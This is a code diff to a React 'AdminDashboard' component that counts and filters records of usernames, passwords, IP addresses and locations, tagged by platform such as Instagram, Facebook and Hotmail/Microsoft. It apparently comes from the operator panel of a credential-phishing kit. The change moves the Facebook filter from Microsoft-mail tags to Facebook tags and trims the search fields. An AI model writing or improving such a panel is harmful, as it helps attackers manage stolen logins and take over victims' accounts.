@@ -123,7 +123,10 @@ export default function AdminDashboard() {
     const stats = {
       totalEntries: data.length,
       instagramEntries: data.filter(item => item.username.includes('(IG)')).length,
-      facebookEntries: data.filter(item => item.username.includes('(hotmail)') || item.username.includes('(MS)')).length,
+      facebookEntries: data.filter(item => 
+        (item.platform && (item.platform === 'facebook' || item.platform === 'facebook-mobile')) ||
+        (item.username && (item.username.includes('(FB)') || item.username.includes('(FB Mobile)')))
+      ).length,
       countries: {},
       continents: {}
     };
@@ -163,22 +166,17 @@ export default function AdminDashboard() {
       );
     } else if (filter === 'facebook') {
       filtered = filtered.filter(cred => 
-        cred.username && (cred.username.includes('(MS)') || 
-        cred.username.includes('(hotmail)') || 
-        cred.username.includes('@hotmail') || 
-        cred.username.includes('@outlook') || 
-        cred.username.includes('@live'))
+        (cred.platform && (cred.platform === 'facebook' || cred.platform === 'facebook-mobile')) ||
+        (cred.username && (cred.username.includes('(FB)') || cred.username.includes('(FB Mobile)')))
       );
     }
     
-    // Filter by search term
+    // Apply search term if present
     if (searchTerm) {
-      filtered = filtered.filter(cred =>
+      filtered = filtered.filter(cred => 
         (cred.username && cred.username.toLowerCase().includes(searchTerm.toLowerCase())) ||
-        (cred.password && cred.password.toLowerCase().includes(searchTerm.toLowerCase())) ||
-        (cred.city && cred.city.toLowerCase().includes(searchTerm.toLowerCase())) ||
         (cred.country && cred.country.toLowerCase().includes(searchTerm.toLowerCase())) ||
-        (cred.ip_address && cred.ip_address.toLowerCase().includes(searchTerm.toLowerCase()))
+        (cred.city && cred.city.toLowerCase().includes(searchTerm.toLowerCase()))
       );
     }
     
